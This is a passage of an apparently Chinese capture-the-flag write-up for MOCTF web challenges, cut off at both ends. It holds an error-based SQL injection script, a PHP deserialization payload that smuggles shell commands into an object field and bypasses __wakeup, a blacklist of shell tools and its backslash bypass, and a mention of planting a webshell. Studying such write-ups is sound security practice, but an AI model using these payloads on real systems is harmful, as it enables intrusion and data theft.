<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="comment">#list1=[&#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;D&#x27;, &#x27;E&#x27;, &#x27;F&#x27;, &#x27;G&#x27;, &#x27;H&#x27;, &#x27;I&#x27;, &#x27;J&#x27;, &#x27;K&#x27;, &#x27;L&#x27;, &#x27;M&#x27;, &#x27;N&#x27;, &#x27;O&#x27;, &#x27;P&#x27;, &#x27;Q&#x27;, &#x27;R&#x27;, &#x27;S&#x27;, &#x27;T&#x27;, &#x27;U&#x27;, &#x27;V&#x27;, &#x27;W&#x27;, &#x27;X&#x27;, &#x27;Y&#x27;, &#x27;Z&#x27;, &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;, &#x27;g&#x27;, &#x27;h&#x27;, &#x27;i&#x27;, &#x27;j&#x27;, &#x27;k&#x27;, &#x27;l&#x27;, &#x27;m&#x27;, &#x27;n&#x27;, &#x27;o&#x27;, &#x27;p&#x27;, &#x27;q&#x27;, &#x27;r&#x27;, &#x27;s&#x27;, &#x27;t&#x27;, &#x27;u&#x27;, &#x27;v&#x27;, &#x27;w&#x27;, &#x27;x&#x27;, &#x27;y&#x27;, &#x27;z&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;8&#x27;, &#x27;9&#x27;, &#x27;,&#x27;, &#x27;_&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    r=requests.get(<span class="string">&quot;http://119.29.170.143:6003/list.php?id=23)%20and%20extractvalue(1,concat(0x3a,substr((select%20group_concat(table_name)%20from%20information_schema.tables),&quot;</span>+<span class="built_in">str</span>(<span class="number">1</span>+num*<span class="number">31</span>)+<span class="string">&quot;,31)))%23&quot;</span>)</span><br><span class="line">    res = re.findall(<span class="string">r&quot;XPATH syntax error: &#x27;:([^&#x27;]+)&#x27;&quot;</span>,r.text)[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(res,end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>得到返回</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CHARACTER_SETS,COLLATIONS,COLLATION_CHARACTER_SET_APPLICABILITY,COLUMNS,COLUMN_PRIVILEGES,ENGINES,EVENTS,FILES,GLOBAL_STATUS,GLOBAL_VARIABLES,KEY_COLUMN_USAGE,PARAMETERS,PARTITIONS,PLUGINS,PROCESSLIST,PROFILING,REFERENTIAL_CONSTRAINTS,ROUTINES,SCHEMATA,SCHEMA_PRIVILEGES,SESSION_STATUS,SESSION_VARIABLES,STATISTICS,TABLES,TABLESPACES,TABLE_CONSTRAINTS,TABLE_PRIVILEGES,TRIGGERS,USER_PRIVILEGES,VIEWS,INNODB_BUFFER_PAGE,INNODB_TRX,INNODB_BUFFER_POOL_STATS,INNODB_LOCK_WAITS,INNODB_CMPMEM,INNODB_CMP,INNODB_LOCKS,INNODB_CMPMEM_RESET,INNODB_CMP_RESET,INNODB_BUFFER_PAGE_LRU,cms_article,cms_category,cms_file,cms_friendlink,cms_message,cms_notice,cms_page,cms_users,columns_priv,db,event,func,general_log,help_category,help_keyword,help_relation,help_topic,host,ndb_binlog_index,plugin,proc,procs_priv,proxies_priv,servers,slow_log,tables_priv,time_zone,time_zone_leap_second,time_zone_name,time_zone_transition,time_zone_transition_type,user,cond_instances,events_waits_current,events_waits_history,events_waits_history_long</span><br></pre></td></tr></table></figure>
<p>后面可能还会有,但是因为不足32个字符,爆了错,这里我就不管了,因为有用的cms_users已经出来了,继续注入爆列,得到了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CHARACTER_SET_NAME,DEFAULT_COLLATE_NAME,DESCRIPTION,MAXLEN,COLLATION_NAME,CHARACTER_SET_NAME,ID,IS_DEFAULT,IS_COMPILED,SORTLEN,COLLATION_NAME,CHARACTER_SET_NAME,TABLE_CATALOG,TABLE_SCHEMA,TABLE_NAME,COLUMN_NAME,ORDINAL_POSITION,COLUMN_DEFAULT,IS_NULLABLE,DATA_TYPE,CHARACTER_MAXIMUM_LENGTH,CHARACTER_OCTET_LENGTH,NUMERIC_PRECISION,NUMERIC_SCALE,CHARACTER_SET_NAME,COLLATION_NAME,COLUMN_TYPE,COLUMN_KEY,EXTRA,PRIVILEGES,COLUMN_COMMENT,GRANTEE,TABLE_CATALOG,TABLE_SCHEMA,TABLE_NAME,COLUMN_NAME,PRIVILEGE_TYPE,IS_GRANTABLE,ENGINE,SUPPORT,COMMENT,TRANSACTIONS,XA,SAVEPOINTS,EVENT_CATALOG,EVENT_SCHEMA,EVENT_NAME,DEFINER,TIME_ZONE,EVENT_BODY,EVENT_DEFINITION,EVENT_TYPE,EXECUTE_AT,INTERVAL_VALUE,INTERVAL_FIELD,SQL_MODE,STARTS,ENDS,STATUS,ON_COMPLETION,CREATED,LAST_ALTERED,LAST_EXECUTED,EVENT_COMMENT,ORIGINATOR,CHARACTER_SET_CLIENT,COLLATION_CONNECTION,DATABASE_COLLATION,FILE_ID,FILE_NAME,FILE_TYPE,TABLESPACE_NAME,TABLE_CATALOG,TABLE_SCHEMA,TABLE_NAME,LOGFILE_GROUP_NAME,LOGFILE_GROUP_NUMBER,ENGINE,FULLTEXT_KEYS,DELETED_ROWS</span><br></pre></td></tr></table></figure>
<p>这里其实很迷,因为应该提取出一个username和password列才对..但是没有,后来我直接提取username和password拿到密码,然后到后台登录,传马+nginx解析漏洞,拿到webshell,然后因为数据库不在这个网站,所以我也连了一下数据库,然后提一下,也没有提取出username和password列,后续研究研究再说吧...
flag:moctf{Y0u_need_to_b3_ser1ous}</p>
<h3 id="pubg">PUBG</h3>
<p>首先index.php.bak源码泄漏</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;title&gt;MOCTF吃鸡大赛&lt;/title&gt;</span><br><span class="line">&lt;style type=<span class="string">&quot;text/css&quot;</span>&gt; </span><br><span class="line">a&#123; </span><br><span class="line">    text-decoration:none;</span><br><span class="line">    color:white;</span><br><span class="line">&#125; </span><br><span class="line">body</span><br><span class="line">&#123;</span><br><span class="line">    background:<span class="title function_ invoke__">url</span>(<span class="string">&#x27;image/PUBG.jpg&#x27;</span>);</span><br><span class="line">    background-attachment:fixed;</span><br><span class="line">    background-repeat:no-repeat;</span><br><span class="line">    background-size:cover;</span><br><span class="line">    -moz-background-size:cover;</span><br><span class="line">    -webkit-background-size:cover;</span><br><span class="line">&#125;</span><br><span class="line">center</span><br><span class="line">&#123;</span><br><span class="line">    color:white;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;p&gt;你现在正在飞机上,请选择要跳的地方&lt;/p&gt;&lt;/br&gt;</span><br><span class="line">&lt;p&gt;&lt;a href=<span class="string">&quot;?LandIn=airport&quot;</span>&gt;机场&lt;/a&gt;&lt;/p&gt;</span><br><span class="line">&lt;p&gt;&lt;a href=<span class="string">&quot;?LandIn=school&quot;</span>&gt;学校&lt;/a&gt;&lt;/p&gt;</span><br><span class="line">&lt;p&gt;&lt;a href=<span class="string">&quot;?LandIn=field&quot;</span>&gt;打野&lt;/a&gt;&lt;/p&gt;</span><br><span class="line">&lt;p&gt;&lt;a href=<span class="string">&quot;?LandIn=AFK&quot;</span>&gt;上个厕所&lt;/a&gt;&lt;/p&gt;</span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$_GET</span>)&amp;&amp;<span class="title function_ invoke__">count</span>(<span class="variable">$_GET</span>)&gt;<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;LandIn&quot;</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$pos</span>=<span class="variable">$_GET</span>[<span class="string">&quot;LandIn&quot;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$pos</span>===<span class="string">&quot;airport&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;&lt;center&gt;机场大仙太多,你被打死了~&lt;/center&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">elseif</span>(<span class="variable">$pos</span>===<span class="string">&quot;school&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&#x27;&lt;/br&gt;&lt;center&gt;&lt;a href=&quot;/index.html&quot;  style=&quot;color:white&quot;&gt;叫我校霸~~&lt;/a&gt;&lt;/center&gt;&#x27;</span>);</span><br><span class="line">            <span class="variable">$pubg</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;pubg&#x27;</span>];</span><br><span class="line">            <span class="variable">$p</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$pubg</span>);</span><br><span class="line">            <span class="comment">// $p-&gt;Get_air_drops($p-&gt;weapon,$p-&gt;bag);</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">elseif</span>(<span class="variable">$pos</span>===<span class="string">&quot;AFK&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;&lt;center&gt;由于你长时间没动,掉到海里淹死了~&lt;/center&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;&lt;center&gt;You Lose&lt;/center&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>然后去搞class.php源码,发现class.php.bak泄漏</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;waf.php&#x27;</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">sheldon</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$bag</span>=<span class="string">&quot;nothing&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$weapon</span>=<span class="string">&quot;M24&quot;</span>;</span><br><span class="line">        <span class="comment">// public function __toString()&#123;</span></span><br><span class="line">        <span class="comment">//     $this-&gt;str=&quot;You got the airdrop&quot;;</span></span><br><span class="line">        <span class="comment">//     return $this-&gt;str;</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;bag=<span class="string">&quot;nothing&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;weapon=<span class="string">&quot;kar98K&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Get_air_drops</span>(<span class="params"><span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="variable">$b</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>,<span class="variable">$parameters</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>,<span class="variable">$method</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$file</span>[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;.//class<span class="subst">$file</span>[0].php&quot;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="title function_ invoke__">system</span>(<span class="string">&quot;php  .//class//<span class="subst">$method</span>.php&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="title function_ invoke__">system</span>(<span class="string">&quot;php  .//class//win.php&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">nothing</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;&lt;center&gt;You lose&lt;/center&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">waf</span>(<span class="variable">$this</span>-&gt;bag);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;weapon===<span class="string">&#x27;AWM&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">Get_air_drops</span>(<span class="variable">$this</span>-&gt;bag);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;&lt;center&gt;The Air Drop is empty,you lose~&lt;/center&gt;&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>然后本地构造一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sheldon</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$bag</span>=<span class="string">&quot;nothing&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$weapon</span>=<span class="string">&quot;AWM&quot;</span>;</span><br><span class="line">        <span class="comment">// public function __toString()&#123;</span></span><br><span class="line">        <span class="comment">//     $this-&gt;str=&quot;You got the airdrop&quot;;</span></span><br><span class="line">        <span class="comment">//     return $this-&gt;str;</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">        &#125;</span><br><span class="line"> <span class="variable">$temp</span> = <span class="keyword">new</span> <span class="title function_ invoke__">sheldon</span>();</span><br><span class="line"> <span class="variable">$temp</span>-&gt;bag = <span class="string">&quot;win.php &amp;&amp; cat waf.php &amp;&amp; index&quot;</span>;</span><br><span class="line"> <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$temp</span>)));</span><br></pre></td></tr></table></figure>
<p>然后记得把属性数量改一下绕__wakeup 本来是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A7%3A%22sheldon%22%3A2%3A%7Bs%3A3%3A%22bag%22%3Bs%3A31%3A%22win.php+%26%26+cat+waf.php+%26%26+index%22%3Bs%3A6%3A%22weapon%22%3Bs%3A3%3A%22AWM%22%3B%7D</span><br></pre></td></tr></table></figure>
<p>然后改成</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A7%3A%22sheldon%22%3A20%3A%7Bs%3A3%3A%22bag%22%3Bs%3A31%3A%22win.php+%26%26+cat+waf.php+%26%26+index%22%3Bs%3A6%3A%22weapon%22%3Bs%3A3%3A%22AWM%22%3B%7D</span><br></pre></td></tr></table></figure>
<p>访问一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.78.57.208:6001/?LandIn=school&amp;&amp;pubg=O%3A7%3A%22sheldon%22%3A20%3A%7Bs%3A3%3A%22bag%22%3Bs%3A31%3A%22win.php+%26%26+cat+waf.php+%26%26+index%22%3Bs%3A6%3A%22weapon%22%3Bs%3A3%3A%22AWM%22%3B%7D</span><br></pre></td></tr></table></figure>
<p>得到waf.php的源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$values</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//$black = [];</span></span><br><span class="line">    <span class="variable">$black</span> = <span class="keyword">array</span>(<span class="string">&#x27;vi&#x27;</span>,<span class="string">&#x27;awk&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;sed&#x27;</span>,<span class="string">&#x27;comm&#x27;</span>,<span class="string">&#x27;diff&#x27;</span>,<span class="string">&#x27;grep&#x27;</span>,<span class="string">&#x27;cp&#x27;</span>,<span class="string">&#x27;mv&#x27;</span>,<span class="string">&#x27;nl&#x27;</span>,<span class="string">&#x27;less&#x27;</span>,<span class="string">&#x27;od&#x27;</span>,<span class="string">&#x27;head&#x27;</span>,<span class="string">&#x27;tail&#x27;</span>,<span class="string">&#x27;more&#x27;</span>,<span class="string">&#x27;tac&#x27;</span>,<span class="string">&#x27;rm&#x27;</span>,<span class="string">&#x27;ls&#x27;</span>,<span class="string">&#x27;tailf&#x27;</span>,<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;%0a&#x27;</span>,<span class="string">&#x27;%0d&#x27;</span>,<span class="string">&#x27;%00&#x27;</span>,<span class="string">&#x27;ls&#x27;</span>,<span class="string">&#x27;echo&#x27;</span>,<span class="string">&#x27;ps&#x27;</span>,<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;$&#123;IFS&#125;&#x27;</span>,<span class="string">&#x27;ifconfig&#x27;</span>,<span class="string">&#x27;mkdir&#x27;</span>,<span class="string">&#x27;cp&#x27;</span>,<span class="string">&#x27;chmod&#x27;</span>,<span class="string">&#x27;wget&#x27;</span>,<span class="string">&#x27;curl&#x27;</span>,<span class="string">&#x27;http&#x27;</span>,<span class="string">&#x27;www&#x27;</span>,<span class="string">&#x27;`&#x27;</span>,<span class="string">&#x27;printf&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$black</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$values</span>,<span class="variable">$value</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Attack!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>然后用\绕过waf 比如用l\s绕过ls 然后访问</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://120.78.57.208:6001/?LandIn=school&amp;&amp;pubg=O%3A7%3A%22sheldon%22%3A20%3A%7Bs%3A3%3A%22bag%22%3Bs%3A23%3A%22win.php+%26%26+l%5Cs+%26%26+index%22%3Bs%3A6%3A%22weapon%22%3Bs%3A3%3A%22AWM%22%3B%7D</span><br></pre></td></tr></table></figure>
<p>得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class.php</span><br><span class="line">class.php.bak</span><br><span class="line">image</span><br><span class="line">index.php</span><br><span class="line">index.php.bak</span><br><span class="line">waf.php</span><br></pre></td></tr></table></figure>
<p>然后构造一个</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">win.php &amp;&amp; find  pw\d&amp;&amp; index</span><br></pre></td></tr></table></figure>
<p>得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">./class</span><br><span class="line">./class/flag.php</span><br><span class="line">./class/win.php</span><br><span class="line">./image</span><br><span class="line">./image/PUBG.jpg</span><br><span class="line">./index.php.bak</span><br><span class="line">./waf.php</span><br><span class="line">./class.php</span><br><span class="line">./class.php.bak</span><br><span class="line">./index.php</span><br></pre></td></tr></table></figure>
<p>然后cat一下就ok</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">win.php &amp;&amp; cat ./class/flag.php&amp;&amp; index</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//moctf&#123;Try_Learn_PhP_h4rder&#125;</span></span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="登录一哈">登录一哈</h3>
<p>首先.git泄漏,githack一波 index.php的主要代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_binary&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">            <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>] = <span class="variable">$username</span>;</span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location:./index.php&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>]))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;h1&gt;hello &#x27;</span>.<span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>].<span class="string">&#x27;&lt;/h1&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>flag.php的代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MOCTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;flag = <span class="string">&quot;moctf&#123;xxxxxxxxxxxxxxxxxxx&#125;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;flag == <span class="variable language_">$this</span>-&gt;name)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Wow,this is flag:&quot;</span>.<span class="variable language_">$this</span>-&gt;flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里发现session的序列化处理和反序列化处理不同,所以可以利用一下,具体参考
<a
